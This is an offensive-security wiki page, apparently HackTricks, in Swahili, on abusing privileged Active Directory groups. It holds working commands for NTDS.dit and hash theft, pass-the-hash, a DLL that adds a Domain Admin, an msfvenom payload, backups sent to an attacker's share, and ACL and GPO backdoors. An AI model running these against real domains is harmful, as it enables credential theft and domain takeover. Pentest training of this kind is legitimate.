# Vikundi Vyenye Haki Maalum

{{#include ../../banners/hacktricks-training.md}}

## Vikundi Vinavyotambulika vyenye haki za usimamizi

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Kundi hili lina uwezo wa kuunda akaunti na vikundi ambavyo si administrators kwenye domain. Zaidi ya hayo, linaruhusu kuingia ndani (local login) kwenye Domain Controller (DC).

Ili kubaini wanachama wa kundi hili, amri ifuatayo inatekelezwa:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Kuongeza watumiaji wapya kunaruhusiwa, pamoja na kuingia kwa watumiaji wa ndani kwenye DC.

## Kikundi cha AdminSDHolder

Access Control List (ACL) ya kikundi cha **AdminSDHolder** ni muhimu kwani inabainisha ruhusa kwa ajili ya "protected groups" zote ndani ya Active Directory, ikiwemo vikundi vya kiwango cha juu cha upatikanaji. Kifaa hiki hufanya usalama wa vikundi hivi kwa kuzuia mabadiliko yasiyoruhusiwa.

Mshambuliaji anaweza kunufaika na hili kwa kubadilisha ACL ya kikundi cha **AdminSDHolder**, akimpa mtumiaji wa kawaida ruhusa kamili. Hii itampa mtumiaji huyo udhibiti kamili wa "protected groups" zote. Ikiwa ruhusa za mtumiaji huyu zitabadilishwa au kuondolewa, zitarejeshwa kiotomatiki ndani ya saa moja kutokana na muundo wa mfumo.

Taarifa za hivi karibuni za Windows Server bado zinachukulia baadhi ya vikundi vya operator vilivyojengwa ndani kama vitu vilivyo **protected** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). Mchakato **SDProp** unaendeshwa kwenye **PDC Emulator** kila dakika 60 kwa chaguo-msingi, unaweka alama `adminCount=1`, na kuzima inheritance kwenye vitu vilivyo protected. Hii ni muhimu kwa persistence na pia kwa kutafuta watumiaji waliokuwa na vyeo vya juu waliotolewa kutoka kwenye kikundi kilicho protected lakini bado wana ACL isiyo-inherit.

Amri za kuangalia wanachama na kubadilisha ruhusa ni pamoja na:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Skripti inapatikana ili kuharakisha mchakato wa urejesho: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Kwa maelezo zaidi, tembelea [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Uanachama katika kundi hili unaruhusu kusoma vitu vya Active Directory vilivyofutwa, ambavyo vinaweza kufichua taarifa nyeti:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Hii ni muhimu kwa **kurejesha njia za ruhusa za awali**. Vitu vilivyofutwa vinaweza bado kufichua `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, SPNs za zamani, au DN ya kikundi chenye ruhusa kilichofutwa ambacho baadaye kinaweza kurejeshwa na operator mwingine.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Ufikiaji wa Domain Controller

Ufikiaji wa faili kwenye DC umezuiwa isipokuwa mtumiaji ni sehemu ya kikundi cha `Server Operators`, ambacho hubadilisha kiwango cha ufikiaji.

### Kuongezeka kwa Ruhusa

Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kukagua na kubadilisha ruhusa za huduma. Kikundi cha `Server Operators`, kwa mfano, kina udhibiti kamili juu ya huduma fulani, na kuruhusu kutekelezwa kwa amri zozote na kuongezeka kwa ruhusa:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Amri hii inaonyesha kuwa `Server Operators` wana upatikanaji kamili, ikiwa na uwezo wa kuendesha services ili kupata ruhusa zilizoinuliwa.

## Backup Operators

Uanachama katika kikundi cha `Backup Operators` kunatoa upatikanaji kwa mfumo wa faili wa `DC01` kutokana na vibali `SeBackup` na `SeRestore`. Vibali hivi vinaruhusu kusafiri ndani ya folda, kuorodhesha, na kunakili faili, hata bila ruhusa za wazi, kwa kutumia bendera `FILE_FLAG_BACKUP_SEMANTICS`. Kutumia scripts maalum ni muhimu kwa mchakato huu.

Ili kuorodhesha wanachama wa kikundi, endesha:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Shambulio la Ndani

Ili kutumia vibali hivi kwenye mashine ya ndani, hatua zifuatazo zinafanywa:

1. Leta maktaba zinazohitajika:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Wezesha na uthibitishe `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Kufikia na kunakili faili kutoka kwa saraka zilizozuiliwa, kwa mfano:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Shambulio la AD

Ufikiaji wa moja kwa moja kwenye mfumo wa faili wa Domain Controller unaruhusu wizi wa database `NTDS.dit`, ambayo ina hash zote za NTLM za watumiaji na kompyuta za domain.

#### Kutumia diskshadow.exe

1. Unda shadow copy ya drive ya `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Nakili `NTDS.dit` kutoka kwenye nakala ya kivuli:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Badala yake, tumia `robocopy` kwa kunakili faili:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Toa `SYSTEM` na `SAM` kwa ajili ya upataji wa hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Pata hash zote kutoka `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Baada ya uchimbaji: Pass-the-Hash kwa DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Kutumia wbadmin.exe

1. Sanidi NTFS filesystem kwa ajili ya SMB server kwenye attacker machine na cache SMB credentials kwenye target machine.
2. Tumia `wbadmin.exe` kwa ajili ya system backup na `NTDS.dit` extraction:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Kwa onyesho la vitendo, angalia [VIDEO YA DEMO NA IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Wajumbe wa kikundi cha **DnsAdmins** wanaweza kutumia privileges zao ili kupakia DLL yoyote yenye SYSTEM privileges kwenye DNS server, ambayo mara nyingi huendeshwa kwenye Domain Controllers. Uwezo huu unatoa fursa kubwa ya exploitation.

Ili kuorodhesha wajumbe wa kikundi cha DnsAdmins, tumia:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Udhaifu huu unaruhusu execution ya arbitrary code kwa SYSTEM privileges katika DNS service (kawaida ndani ya DCs). Tatizo hili lilirekebishwa mwaka 2021.

Members wanaweza kufanya DNS server kupakia arbitrary DLL (ama locally au kutoka kwenye remote share) kwa kutumia amri kama:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Kuanza upya huduma ya DNS (ambayo huenda ikahitaji ruhusa za ziada) inahitajika ili DLL ipakwe:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Kwa maelezo zaidi kuhusu vector hii ya shambulio, rejea ired.team.

#### Mimilib.dll

Inawezekana pia kutumia mimilib.dll kwa utekelezaji wa amri, kuibadilisha ili kutekeleza amri maalum au reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### WPAD Rekodi kwa MitM

DnsAdmins wanaweza kubadilisha rekodi za DNS kufanya Man-in-the-Middle (MitM) attacks kwa kuunda rekodi ya WPAD baada ya kuzima global query block list. Zana kama Responder au Inveigh zinaweza kutumika kwa spoofing na capturing network traffic.

### Event Log Readers

Wanachama wanaweza kufikia event logs, kwa uwezekano kupata taarifa nyeti kama plaintext passwords au maelezo ya utekelezaji wa amri:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Kikundi hiki kinaweza kubadilisha DACLs kwenye domain object, na hivyo kinaweza kutoa DCSync privileges. Mbinu za privilege escalation zinazotumia kikundi hiki zimetajwa kwa undani kwenye Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Ikiwa unaweza kutenda kama mwanachama wa kundi hili, matumizi ya kawaida ni kumpa mhusika anayedhibitiwa na mshambuliaji haki za replication zinazohitajika kwa [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Kihistoria, **PrivExchange** ilisababisha ufikiaji wa mailbox uliounganishwa, kulazimishwa kwa Exchange authentication, na LDAP relay hadi kuishia kwenye primitive hii. Hata kwa maeneo ambapo njia ya relay imepunguzwa, uanachama wa moja kwa moja katika `Exchange Windows Permissions` au udhibiti wa Exchange server bado ni njia yenye thamani kubwa ya kupata domain replication rights.

## Hyper-V Administrators

Hyper-V Administrators wana upatikanaji kamili wa Hyper-V, ambao unaweza kutumika kupata udhibiti wa Domain Controllers zilizovirtualized. Hii inajumuisha cloning live DCs na kutoa NTLM hashes kutoka kwa faili NTDS.dit.

### Exploitation Example

Utekelezaji wa vitendo kawaida ni ufikiaji offline wa disk za DC/checkpoints badala ya mbinu za zamani za host-level LPE. Kwa ufikiaji wa Hyper-V host, operator anaweza kufanya checkpoint au export Domain Controller iliyovirtualized, mount VHDX, na kutoa `NTDS.dit`, `SYSTEM`, na siri nyingine bila kugusa LSASS ndani ya guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Kutoka hapo, tumia tena mtiririko wa kazi wa `Backup Operators` kunakili `Windows\NTDS\ntds.dit` na registry hives nje ya mtandao.

## Group Policy Creators Owners

Kikundi hiki kinawawezesha wanachama kuunda Group Policies katika domain. Hata hivyo, wanachama wake hawawezi kutekeleza group policies kwa watumiaji au vikundi au kuhariri GPOs zilizopo.

Tofauti muhimu ni kwamba **muumba anakuwa mmiliki wa GPO mpya** na kwa kawaida hupata haki za kutosha kuihariri baadaye. Hii ina maana kikundi hiki kinavutia wakati unaweza kufanya mojawapo ya yafuatayo:

- kuunda GPO mbaya na kumshawishi admin kuibandisha kwa OU/domain iliyolengwa
- kuhariri GPO uliouunda ambayo tayari imeunganishwa mahali pa manufaa
- kutumia vibaya haki nyingine iliyotengwa inayokuruhusu kuunganisha GPOs, huku kikundi hiki kikikupa uwezo wa kuhariri

Matumizi mabaya ya vitendo kwa kawaida yanahusisha kuongeza **Immediate Task**, **startup script**, **local admin membership**, au mabadiliko ya **user rights assignment** kupitia faili za sera zinazoungwa mkono na SYSVOL.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
If editing the GPO manually through `SYSVOL`, remember the change is not enough by itself: `versionNumber`, `GPT.ini`, and sometimes `gPCMachineExtensionNames` must also be updated or clients will ignore the policy refresh.

## Usimamizi wa Shirika

Katika mazingira ambapo **Microsoft Exchange** imewekwa, kikundi maalum kinachoitwa **Organization Management** kina uwezo mkubwa. Kikundi hiki kina haki ya **kuingia kwenye masanduku ya barua (mailboxes) ya watumiaji wote wa domain** na kinashikilia **udhibiti kamili wa 'Microsoft Exchange Security Groups'** Organizational Unit (OU). Udhibiti huu unajumuisha kikundi cha **`Exchange Windows Permissions`**, ambacho kinaweza kutumika kwa kuongeza ruhusa (privilege escalation).

### Unyonyaji wa Ruhusa na Amri

#### Print Operators

Wanamemba wa kikundi cha **Print Operators** wamepewa ruhusa kadhaa, ikiwa ni pamoja na **`SeLoadDriverPrivilege`**, ambayo inawawezesha **kuingia kwa ndani (log on locally) kwenye Domain Controller**, kuizima, na kusimamia printers. Ili kutumikia/kuvunja ruhusa hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani chini ya muktadha usio na viwango vya juu (unelevated), ni lazima kupita User Account Control (UAC).

Ili kuorodhesha wanachama wa kikundi hiki, amri ifuatayo ya PowerShell inatumika:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Kwenye Domain Controllers, kikundi hiki ni hatari kwa sababu sera ya default ya Domain Controller inawapa `Print Operators` **`SeLoadDriverPrivilege`**. Ikiwa utapata token ya hadhi ya juu kwa mshiriki wa kikundi hiki, unaweza kuwezesha privilege na kupakia driver iliyosainiwa lakini yenye udhaifu ili kufikia kernel/SYSTEM. Kwa maelezo kuhusu kushughulikia token, angalia [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Watumiaji wa Remote Desktop

Wanachama wa kikundi hiki wanapewa ufikiaji wa PC kupitia Remote Desktop Protocol (RDP). Ili kuorodhesha wanachama hawa, amri za PowerShell zinapatikana:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Maelezo zaidi kuhusu exploiting RDP yanaweza kupatikana katika rasilimali maalum za pentesting.

#### Watumiaji wa Usimamizi wa Mbali

Wanachama wanaweza kufikia PCs kwa kutumia **Windows Remote Management (WinRM)**. Enumeration ya wanachama hawa inafanywa kupitia:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
For exploitation techniques related to **WinRM**, specific documentation should be consulted.

#### Server Operators

Kikundi hiki kina ruhusa za kufanya usanidi mbalimbali kwenye Domain Controllers, ikiwa ni pamoja na ruhusa za backup na restore, kubadilisha saa ya mfumo, na kuzima mfumo. Kuorodhesha wanachama, amri iliyotolewa ni:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Kwenye Domain Controllers, `Server Operators` kwa kawaida hupata haki za kutosha za **kupanga upya au kuanza/kusimamisha services** na pia hupokea `SeBackupPrivilege`/`SeRestorePrivilege` kupitia sera ya chaguo-msingi ya DC. Kwa vitendo, hili linawafanya kuwa daraja kati ya **service-control abuse** na **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Ikiwa ACL ya huduma inawapa kundi hili haki za kubadilisha/kuanzisha, elekeza huduma kwa amri yoyote, ianze kama `LocalSystem`, kisha urejeshe `binPath` ya awali. Ikiwa udhibiti wa huduma umefungwa, tumia mbinu za `Backup Operators` zilizotajwa hapo juu ili kunakili `NTDS.dit`.

## References <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
